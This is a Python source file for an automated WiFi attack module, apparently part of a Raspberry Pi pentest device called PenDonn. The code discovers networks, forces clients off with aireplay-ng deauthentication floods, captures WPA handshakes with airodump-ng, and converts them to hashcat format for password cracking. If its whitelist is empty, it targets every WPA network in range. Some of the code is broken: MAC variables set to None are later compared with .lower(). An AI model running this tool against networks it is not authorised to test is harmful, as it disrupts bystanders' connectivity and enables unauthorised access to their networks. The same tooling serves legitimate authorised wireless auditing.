"""
PenDonn WiFi Monitor Module
Handles WiFi scanning, channel hopping, and handshake capture.
"""

import os
import time
import threading
import subprocess
import logging
from datetime import datetime
from typing import List, Dict, Optional, Set
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, EAPOL, RadioTap
import json

logger = logging.getLogger(__name__)


class WiFiMonitor:
    """WiFi monitoring and handshake capture"""
    
    def __init__(self, config: Dict, database):
        """Initialize WiFi monitor"""
        self.config = config
        self.db = database
        
        # Auto-detect correct interfaces based on MAC addresses
        self.management_mac = None  # Will be detected from config
        self.single_interface_mode = config['wifi'].get('single_interface_mode', False)
        self.allow_management_wifi = config['wifi'].get('allow_management_wifi', False)
        
        detected_interfaces = self._detect_wifi_interfaces()
        
        # Single interface mode (RPi Zero 2 W with only onboard WiFi)
        if self.single_interface_mode:
            logger.warning("⚠️  SINGLE INTERFACE MODE ENABLED")
            logger.warning("⚠️  Using onboard WiFi for monitor mode - YOU WILL LOSE SSH CONNECTION!")
            logger.warning("⚠️  Ensure you have local access (HDMI + keyboard) or auto-start on boot")
            self.monitor_interface = config['wifi']['management_interface']
            self.attack_interface = config['wifi']['management_interface']
        elif len(detected_interfaces) < 2:
            logger.error(f"Not enough WiFi adapters! Found {len(detected_interfaces)}, need at least 2 external adapters")
            logger.error("Please plug in external WiFi adapters OR enable single_interface_mode in config")
            # Use detected interfaces, fallback to config if detection fails
            self.monitor_interface = detected_interfaces[0] if len(detected_interfaces) >= 1 else config['wifi']['monitor_interface']
            self.attack_interface = detected_interfaces[1] if len(detected_interfaces) >= 2 else config['wifi']['attack_interface']
        else:
            # Use detected interfaces, fallback to config if detection fails
            self.monitor_interface = detected_interfaces[0] if len(detected_interfaces) >= 1 else config['wifi']['monitor_interface']
            self.attack_interface = detected_interfaces[1] if len(detected_interfaces) >= 2 else config['wifi']['attack_interface']
        
        logger.info(f"Using interfaces: monitor={self.monitor_interface}, attack={self.attack_interface}")
        
        self.channel_hop_interval = config['wifi']['channel_hop_interval']
        self.handshake_timeout = config['wifi']['handshake_timeout']
        
        self.whitelist_ssids = set(config['whitelist']['ssids'])
        self.running = False
        self.current_channel = 1
        
        # Track discovered networks
        self.networks = {}  # bssid -> network_info
        self.handshake_dir = "./handshakes"
        os.makedirs(self.handshake_dir, exist_ok=True)
        
        # Active captures
        self.active_captures = {}  # bssid -> capture_info
        
        logger.info("WiFi Monitor initialized")
        if self.whitelist_ssids:
            logger.info(f"Whitelist active: Only attacking {len(self.whitelist_ssids)} SSIDs: {list(self.whitelist_ssids)}")
        else:
            logger.warning("Whitelist is EMPTY - will attack ALL networks discovered!")
    
    def _detect_wifi_interfaces(self) -> List[str]:
        """Detect external WiFi interfaces (exclude management interface with active connection)"""
        try:
            # First, detect which interface has an active IP (this is management/SSH)
            connected_interface = None
            try:
                addr_result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True, check=True)
                current_iface = None
                for line in addr_result.stdout.split('\n'):
                    if 'wlan' in line and ': ' in line:
                        parts = line.split(': ')
                        if len(parts) >= 2:
                            current_iface = parts[1].split('@')[0]
                    elif 'inet ' in line and current_iface and 'scope global' in line:
                        # This interface has an IP address
                        connected_interface = current_iface
                        logger.info(f"Detected connected interface: {connected_interface} (has active IP)")
                        break
            except Exception as e:
                logger.warning(f"Could not detect connected interface: {e}")
            
            # Now detect all WiFi interfaces
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, check=True)
            lines = result.stdout.split('\n')
            
            logger.info(f"Scanning for WiFi interfaces, connected interface: {connected_interface}")
            
            external_interfaces = []
            current_interface = None
            
            for line in lines:
                # Line with interface name: "3: wlan0: <BROADCAST..."
                if ': ' in line and 'wlan' in line:
                    parts = line.split(': ')
                    if len(parts) >= 2:
                        current_interface = parts[1].split('@')[0]  # Get interface name
                
                # Line with MAC: "    link/ether aa:bb:cc:dd:ee:ff" or "    link/ieee802.11"
                elif ('link/ether' in line or 'link/ieee802.11' in line) and current_interface:
                    # Skip if this is the connected interface (SSH connection)
                    if current_interface == connected_interface:
                        logger.info(f"Skipping {current_interface} - has active SSH connection")
                        current_interface = None
                        continue
                    
                    # Extract MAC if available
                    parts = line.strip().split()
                    mac = parts[1] if len(parts) > 1 else "unknown"
                    
                    # Also check against hardcoded MAC as fallback
                    if mac.lower() == self.management_mac.lower():
                        logger.info(f"Skipping {current_interface} ({mac}) - matches management MAC")
                    else:
                        external_interfaces.append(current_interface)
                        logger.info(f"Detected external WiFi: {current_interface} ({mac})")
                    
                    current_interface = None
            
            logger.info(f"Detection complete: found {len(external_interfaces)} external interfaces: {external_interfaces}")
            return external_interfaces
            
        except Exception as e:
            logger.error(f"Failed to detect WiFi interfaces: {e}")
            return []
    
    def start(self):
        """Start WiFi monitoring"""
        logger.info("Starting WiFi monitor...")
        
        # Validate interfaces exist and aren't the management interface
        if not self._validate_interfaces():
            logger.error("Cannot start WiFi monitor - interface validation failed")
            logger.error("Make sure external WiFi adapters are plugged in")
            return False
        
        # Enable monitor mode on interfaces
        self._enable_monitor_mode(self.monitor_interface)
        self._enable_monitor_mode(self.attack_interface)
        
        self.running = True
        
        # Start channel hopping thread
        channel_thread = threading.Thread(target=self._channel_hopper, daemon=True)
        channel_thread.start()
        
        # Start packet sniffing
        sniff_thread = threading.Thread(target=self._packet_sniffer, daemon=True)
        sniff_thread.start()
        
        # Start handshake capture monitor
        capture_thread = threading.Thread(target=self._capture_monitor, daemon=True)
        capture_thread.start()
        
        logger.info("WiFi monitor started")
    
    def stop(self):
        """Stop WiFi monitoring"""
        logger.info("Stopping WiFi monitor...")
        self.running = False
        
        # Restore managed mode
        self._disable_monitor_mode(self.monitor_interface)
        self._disable_monitor_mode(self.attack_interface)
        
        logger.info("WiFi monitor stopped")
    
    def _validate_interfaces(self) -> bool:
        """Validate that monitor interfaces exist and aren't the management interface"""
        try:
            # Get list of network interfaces
            result = subprocess.run(['ip', 'link', 'show'], 
                                  capture_output=True, text=True, check=True)
            interfaces = result.stdout
            
            # Check if monitor interface exists
            if self.monitor_interface not in interfaces:
                logger.error(f"Monitor interface {self.monitor_interface} does not exist!")
                logger.error("External WiFi adapter may not be plugged in")
                return False
            
            # Check if attack interface exists
            if self.attack_interface not in interfaces:
                logger.error(f"Attack interface {self.attack_interface} does not exist!")
                logger.error("External WiFi adapter may not be plugged in")
                return False
            
            # Get the MAC address of the onboard WiFi (management interface)
            # This is the WiFi you're SSH'd through - NEVER put it in monitor mode!
            onboard_mac = None  # Detect from system
            
            # Check if monitor interface is the onboard WiFi
            result = subprocess.run(['ip', 'link', 'show', self.monitor_interface],
                                  capture_output=True, text=True, check=True)
            if onboard_mac.lower() in result.stdout.lower():
                if not self.allow_management_wifi and not self.single_interface_mode:
                    logger.error(f"CRITICAL: {self.monitor_interface} is your management WiFi!")
                    logger.error("Cannot put management WiFi in monitor mode - you'll lose SSH!")
                    return False
                else:
                    logger.warning(f"⚠️  {self.monitor_interface} is management WiFi - proceeding in single interface mode")
            
            # Check if attack interface is the onboard WiFi
            result = subprocess.run(['ip', 'link', 'show', self.attack_interface],
                                  capture_output=True, text=True, check=True)
            if onboard_mac.lower() in result.stdout.lower():
                if not self.allow_management_wifi and not self.single_interface_mode:
                    logger.error(f"CRITICAL: {self.attack_interface} is your management WiFi!")
                    logger.error("Cannot put management WiFi in monitor mode - you'll lose SSH!")
                    return False
                else:
                    logger.warning(f"⚠️  {self.attack_interface} is management WiFi - proceeding in single interface mode")
            
            logger.info(f"Interfaces validated: {self.monitor_interface}, {self.attack_interface}")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Interface validation failed: {e}")
            return False
    
    def _enable_monitor_mode(self, interface: str):
        """Enable monitor mode on interface"""
        try:
            # CRITICAL: Only kill NetworkManager if absolutely necessary
            # For external WiFi adapters, we don't need to kill NetworkManager
            # NetworkManager will ignore interfaces in monitor mode automatically
            
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            
            # Set monitor mode
            subprocess.run(['iw', interface, 'set', 'monitor', 'control'], check=True)
            
            # Bring interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            
            logger.info(f"Monitor mode enabled on {interface}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to enable monitor mode on {interface}: {e}")
    
    def _disable_monitor_mode(self, interface: str):
        """Disable monitor mode on interface"""
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['iw', interface, 'set', 'type', 'managed'], check=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            logger.info(f"Monitor mode disabled on {interface}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to disable monitor mode on {interface}: {e}")
    
    def _channel_hopper(self):
        """Hop through WiFi channels"""
        channels = list(range(1, 14))  # 2.4GHz channels
        channel_idx = 0
        
        logger.info(f"Channel hopper started - will cycle through channels 1-13")
        
        while self.running:
            try:
                channel = channels[channel_idx % len(channels)]
                subprocess.run(['iw', 'dev', self.monitor_interface, 'set', 'channel', str(channel)],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.current_channel = channel
                
                # Log channel every 10 hops (every 20 seconds)
                if channel_idx % 10 == 0:
                    logger.debug(f"Channel hopping: now on channel {channel}")
                
                channel_idx += 1
                time.sleep(self.channel_hop_interval)
            except Exception as e:
                logger.error(f"Channel hopping error: {e}")
                time.sleep(1)
    
    def _packet_sniffer(self):
        """Sniff WiFi packets to discover networks"""
        packet_count = 0
        beacon_count = 0
        last_log_time = time.time()
        
        def packet_handler(pkt):
            nonlocal packet_count, beacon_count, last_log_time
            packet_count += 1
            
            # Log stats every 10 seconds even if no beacons
            current_time = time.time()
            if current_time - last_log_time > 10:
                logger.info(f"📊 Packet sniffer stats: {packet_count} total packets, {beacon_count} beacons processed")
                last_log_time = current_time
            
            if not self.running:
                return
            
            try:
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    beacon_count += 1
                    
                    # Log every 100 beacons
                    if beacon_count % 100 == 0:
                        logger.debug(f"Packet sniffer stats: {packet_count} packets, {beacon_count} beacons")
                    
                    self._process_beacon(pkt)
                elif pkt.haslayer(EAPOL):
                    self._process_eapol(pkt)
            except Exception as e:
                logger.error(f"Packet processing error: {e}")
                import traceback
                logger.error(traceback.format_exc())
        
        try:
            logger.info(f"Starting packet sniffer on {self.monitor_interface}")
            sniff(iface=self.monitor_interface, prn=packet_handler, store=0)
        except Exception as e:
            logger.error(f"Packet sniffing error: {e}")
    
    def _process_beacon(self, pkt):
        """Process beacon/probe response frames"""
        try:
            bssid = pkt[Dot11].addr3
            
            # Extract SSID
            ssid = ""
            if pkt.haslayer(Dot11Elt):
                ssid_layer = pkt[Dot11Elt]
                while isinstance(ssid_layer, Dot11Elt):
                    if ssid_layer.ID == 0:  # SSID element
                        ssid = ssid_layer.info.decode('utf-8', errors='ignore')
                        break
                    ssid_layer = ssid_layer.payload
            
            # Skip if no SSID
            if not ssid:
                return
            
            # Extract channel
            channel = self.current_channel
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 3:  # DS Parameter set
                        channel = ord(elt.info)
                        break
                    elt = elt.payload
            
            # Detect encryption by parsing capability info and RSN/WPA elements
            encryption = self._detect_encryption(pkt)
            
            logger.debug(f"Network {ssid} ({bssid}): encryption={encryption}")
            
            # Signal strength - try multiple methods
            signal = -100  # Default fallback
            
            # Method 1: RadioTap dBm_AntSignal
            if pkt.haslayer(RadioTap):
                try:
                    if hasattr(pkt[RadioTap], 'dBm_AntSignal'):
                        signal = pkt[RadioTap].dBm_AntSignal
                except Exception as e:
                    logger.debug(f"RadioTap signal parsing failed: {e}")
            
            # Method 2: notdecoded field (fallback)
            if signal == -100 and hasattr(pkt, 'notdecoded') and len(pkt.notdecoded) >= 4:
                try:
                    signal = -(256 - ord(pkt.notdecoded[-4:-3]))
                except Exception as e:
                    logger.debug(f"notdecoded signal parsing failed: {e}")
            
            # Store/update network
            if bssid not in self.networks:
                self.networks[bssid] = {
                    'ssid': ssid,
                    'bssid': bssid,
                    'channel': channel,
                    'encryption': encryption,
                    'signal': signal,
                    'last_seen': datetime.now()
                }
                
                # Add to database
                network_id = self.db.add_network(ssid, bssid, channel, encryption, signal)
                self.networks[bssid]['id'] = network_id
                
                # Set whitelist flag if this SSID is in whitelist
                if ssid in self.whitelist_ssids:
                    self.db.set_whitelist(bssid, True)
                
                logger.info(f"✓ Target network: {ssid} ({bssid}) on channel {channel} - {encryption}")
            else:
                # Update existing network
                self.networks[bssid]['last_seen'] = datetime.now()
                self.networks[bssid]['signal'] = signal
                self.networks[bssid]['channel'] = channel
                self.networks[bssid]['encryption'] = encryption
                # Update database too
                self.db.add_network(ssid, bssid, channel, encryption, signal)
                
                # Update whitelist flag if SSID is in whitelist
                if ssid in self.whitelist_ssids:
                    self.db.set_whitelist(bssid, True)
            
            # Start handshake capture if WPA/WPA2 and not already capturing
            # WHITELIST LOGIC: Only attack networks IN the whitelist
            if 'WPA' in encryption and bssid not in self.active_captures:
                # Check if network should be attacked (whitelist check)
                if self.whitelist_ssids and ssid not in self.whitelist_ssids:
                    logger.debug(f"Network {ssid} discovered but not attacking - not in whitelist")
                else:
                    logger.info(f"→ Starting handshake capture for {ssid}")
                    self._start_handshake_capture(bssid, ssid, channel)
            elif 'WPA' not in encryption and bssid not in self.active_captures:
                # Only skip networks that are NOT already being captured
                # Only log skip message for new networks or once every 5 minutes
                should_log = bssid not in self.networks
                if not should_log and self.networks[bssid].get('last_skip_log', 0) < time.time() - 300:
                    should_log = True
                
                if should_log:
                    logger.info(f"⊘ Skipping {ssid} - {encryption} network (no handshake possible)")
                    if bssid in self.networks:
                        self.networks[bssid]['last_skip_log'] = time.time()
        
        except Exception as e:
            logger.debug(f"Beacon processing error: {e}")
    
    def _detect_encryption(self, pkt) -> str:
        """Detect encryption type from beacon/probe response"""
        try:
            # Check capability field for privacy bit
            cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
            
            # If privacy bit is not set, it's an open network
            if 'privacy' not in cap.lower():
                return "Open"
            
            # Parse information elements to find RSN (WPA2) or WPA
            has_rsn = False
            has_wpa = False
            
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    # ID 48 = RSN (WPA2)
                    if elt.ID == 48:
                        has_rsn = True
                    # ID 221 with specific OUI = WPA
                    elif elt.ID == 221 and len(elt.info) >= 4:
                        # Check for WPA OUI: 00:50:F2:01
                        if elt.info[:4] == b'\x00\x50\xf2\x01':
                            has_wpa = True
                    elt = elt.payload
            
            # Determine encryption type
            if has_rsn and has_wpa:
                return "WPA/WPA2"
            elif has_rsn:
                return "WPA2"
            elif has_wpa:
                return "WPA"
            else:
                # Privacy bit set but no WPA/WPA2 found = WEP
                return "WEP"
                
        except Exception as e:
            logger.debug(f"Encryption detection error: {e}")
            return "Unknown"
    
    def _get_encryption_type(self, crypto: set) -> str:
        """Determine encryption type"""
        if not crypto:
            return "Open"
        
        encryption_parts = []
        if 'WPA2' in crypto:
            encryption_parts.append('WPA2')
        if 'WPA' in crypto:
            encryption_parts.append('WPA')
        if 'WEP' in crypto:
            encryption_parts.append('WEP')
        
        return '/'.join(encryption_parts) if encryption_parts else "Unknown"
    
    def _process_eapol(self, pkt):
        """Process EAPOL packets (handshake frames)"""
        try:
            bssid = pkt[Dot11].addr3
            if bssid in self.active_captures:
                capture_info = self.active_captures[bssid]
                capture_info['eapol_count'] += 1
                
                # Check if we have full handshake (4 EAPOL frames)
                if capture_info['eapol_count'] >= 4:
                    self._finalize_handshake(bssid)
        
        except Exception as e:
            logger.debug(f"EAPOL processing error: {e}")
    
    def _start_handshake_capture(self, bssid: str, ssid: str, channel: int):
        """Start capturing handshake for a network"""
        try:
            # Create unique filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            bssid_clean = bssid.replace(':', '')
            capture_base = os.path.join(self.handshake_dir, f"{bssid_clean}_{timestamp}")
            
            logger.info(f"⚡ Starting handshake capture for {ssid} ({bssid}) on channel {channel}")
            
            # Use monitor interface for airodump since that's where we see the networks
            # The monitor interface is already in monitor mode from packet sniffing
            capture_interface = self.monitor_interface
            
            # Start airodump-ng to capture handshake
            cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', capture_base,
                '--output-format', 'cap',
                capture_interface  # Use monitor interface instead of attack interface
            ]
            
            logger.debug(f"Running: {' '.join(cmd)}")
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Wait a moment and check if process started successfully
            time.sleep(2)
            poll_result = process.poll()
            if poll_result is not None:
                stdout, stderr = process.communicate()
                logger.error(f"airodump-ng failed to start (exit code {poll_result}):")
                logger.error(f"STDOUT: {stdout.decode()}")
                logger.error(f"STDERR: {stderr.decode()}")
                return
            
            # airodump-ng creates files like: basename-01.cap
            capture_file = capture_base + '-01.cap'
            
            # Verify process is actually running
            try:
                os.kill(process.pid, 0)  # Check if process exists
                logger.debug(f"airodump-ng process {process.pid} confirmed running")
            except OSError:
                logger.error(f"airodump-ng process {process.pid} not found!")
                return
            
            self.active_captures[bssid] = {
                'ssid': ssid,
                'channel': channel,
                'process': process,
                'capture_file': capture_file,
                'capture_base': capture_base,
                'start_time': time.time(),
                'deauth_sent': False
            }
            
            logger.info(f"✓ Capture started for {ssid} - file: {os.path.basename(capture_file)}")
            
            # Send deauth packets after a delay to force handshake
            threading.Thread(target=self._send_deauth, args=(bssid, channel), daemon=True).start()
        
        except Exception as e:
            logger.error(f"Failed to start handshake capture for {bssid}: {e}")
            import traceback
            logger.debug(traceback.format_exc())
    
    def _send_deauth(self, bssid: str, channel: int):
        """Send deauth packets to trigger handshake"""
        try:
            # Wait for airodump-ng to start capturing
            time.sleep(5)
            
            if bssid not in self.active_captures:
                return
            
            capture_info = self.active_captures[bssid]
            ssid = capture_info['ssid']
            
            logger.info(f"💥 Sending deauth packets to {ssid} ({bssid})...")
            
            # Use monitor interface for deauth too - same interface that sees the network
            deauth_interface = self.monitor_interface
            
            # First, ensure monitor interface is on the correct channel (it might be hopping)
            try:
                subprocess.run(['iw', 'dev', deauth_interface, 'set', 'channel', str(channel)],
                             capture_output=True, check=True, timeout=5)
                logger.debug(f"Set {deauth_interface} to channel {channel}")
            except Exception as e:
                logger.warning(f"Failed to set channel: {e}")
            
            # Send deauth packets (broadcast to all clients)
            result = subprocess.run([
                'aireplay-ng',
                '--deauth', '10',
                '-a', bssid,
                deauth_interface
            ], capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                logger.info(f"✓ Deauth sent to {ssid}")
                capture_info['deauth_sent'] = True
            else:
                error_msg = result.stderr.strip() if result.stderr else result.stdout.strip()
                logger.warning(f"Deauth failed for {ssid}: {error_msg[:200]}")
                # Mark as sent anyway so we still check for handshake
                capture_info['deauth_sent'] = True
        
        except subprocess.TimeoutExpired:
            logger.warning(f"Deauth timeout for {bssid}")
        except Exception as e:
            logger.error(f"Deauth error for {bssid}: {e}")
    
    def _capture_monitor(self):
        """Monitor active captures and finalize timeouts"""
        logger.info("Capture monitor thread started")
        
        while self.running:
            try:
                current_time = time.time()
                
                if self.active_captures:
                    logger.debug(f"Monitoring {len(self.active_captures)} active captures")
                
                for bssid in list(self.active_captures.keys()):
                    capture_info = self.active_captures[bssid]
                    elapsed = current_time - capture_info['start_time']
                    ssid = capture_info['ssid']
                    
                    # Check if airodump process is still alive
                    process = capture_info['process']
                    if process.poll() is not None:
                        logger.warning(f"airodump-ng process died for {ssid}! Restarting...")
                        self._stop_capture(bssid)
                        # Try to restart (handled by network discovery on next beacon)
                        continue
                    
                    # Check periodically for handshake (every 30 seconds after deauth)
                    if capture_info.get('deauth_sent') and elapsed > 30 and int(elapsed) % 30 < 10:
                        logger.info(f"🔍 Checking for handshake in {ssid} capture (elapsed: {int(elapsed)}s)...")
                        if self._verify_handshake(capture_info['capture_file']):
                            logger.info(f"🎯 Handshake captured for {ssid}!")
                            self._finalize_handshake(bssid)
                            continue
                    
                    # Timeout after configured duration
                    if elapsed > self.handshake_timeout:
                        logger.info(f"⏱️  Capture timeout for {ssid} ({int(elapsed)}s)")
                        # Final check
                        if self._verify_handshake(capture_info['capture_file']):
                            logger.info(f"🎯 Handshake captured for {ssid}!")
                            self._finalize_handshake(bssid)
                        else:
                            logger.warning(f"❌ No handshake captured for {ssid}")
                            self._stop_capture(bssid)
                
                time.sleep(10)
            
            except Exception as e:
                logger.error(f"Capture monitor error: {e}")
                import traceback
                logger.debug(traceback.format_exc())
                time.sleep(5)
    
    def _verify_handshake(self, capture_file: str) -> bool:
        """Verify if capture file contains valid handshake"""
        if not os.path.exists(capture_file):
            logger.debug(f"Capture file doesn't exist: {capture_file}")
            return False
        
        # Check file size
        file_size = os.path.getsize(capture_file)
        if file_size < 1000:
            logger.debug(f"Capture file too small: {file_size} bytes")
            return False
        
        try:
            # Use aircrack-ng to verify handshake
            logger.debug(f"Verifying handshake in {os.path.basename(capture_file)}...")
            result = subprocess.run(
                ['aircrack-ng', capture_file],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            output = result.stdout.lower()
            
            # Check for handshake indicators
            if '1 handshake' in output or 'handshake' in output:
                logger.info(f"✓ Valid handshake found in {os.path.basename(capture_file)}")
                return True
            
            logger.debug(f"No handshake found in {os.path.basename(capture_file)}")
            return False
        
        except subprocess.TimeoutExpired:
            logger.warning(f"Handshake verification timeout for {capture_file}")
            return False
        except Exception as e:
            logger.error(f"Handshake verification error: {e}")
            return False
            return False
    
    def _finalize_handshake(self, bssid: str):
        """Finalize handshake capture"""
        try:
            capture_info = self.active_captures[bssid]
            capture_file = capture_info['capture_file']
            
            # Convert to hashcat format
            hc_file = capture_file.replace('.cap', '.hc22000')
            subprocess.run([
                'hcxpcapngtool',
                '-o', hc_file,
                capture_file
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Stop capture
            self._stop_capture(bssid)
            
            # Add to database
            network_id = self.networks[bssid]['id']
            quality = "good" if capture_info['eapol_count'] >= 4 else "unknown"
            
            self.db.add_handshake(
                network_id=network_id,
                bssid=bssid,
                ssid=capture_info['ssid'],
                file_path=capture_file,
                quality=quality
            )
            
            logger.info(f"Handshake captured for {capture_info['ssid']} ({bssid})")
        
        except Exception as e:
            logger.error(f"Error finalizing handshake for {bssid}: {e}")
    
    def _stop_capture(self, bssid: str):
        """Stop capture process for a network"""
        if bssid in self.active_captures:
            try:
                capture_info = self.active_captures[bssid]
                capture_info['process'].terminate()
                capture_info['process'].wait(timeout=5)
            except Exception as e:
                logger.debug(f"Error stopping capture for {bssid}: {e}")
            finally:
                del self.active_captures[bssid]
    
    def get_discovered_networks(self) -> List[Dict]:
        """Get list of discovered networks"""
        return list(self.networks.values())
    
    def add_to_whitelist(self, ssid: str):
        """Add SSID to whitelist"""
        self.whitelist_ssids.add(ssid)
        logger.info(f"Added {ssid} to whitelist")
    
    def remove_from_whitelist(self, ssid: str):
        """Remove SSID from whitelist"""
        self.whitelist_ssids.discard(ssid)
        logger.info(f"Removed {ssid} from whitelist")
    
    def get_status(self) -> Dict:
        """Get current monitor status"""
        return {
            'running': self.running,
            'current_channel': self.current_channel,
            'networks_discovered': len(self.networks),
            'active_captures': len(self.active_captures),
            'whitelist_count': len(self.whitelist_ssids)
        }
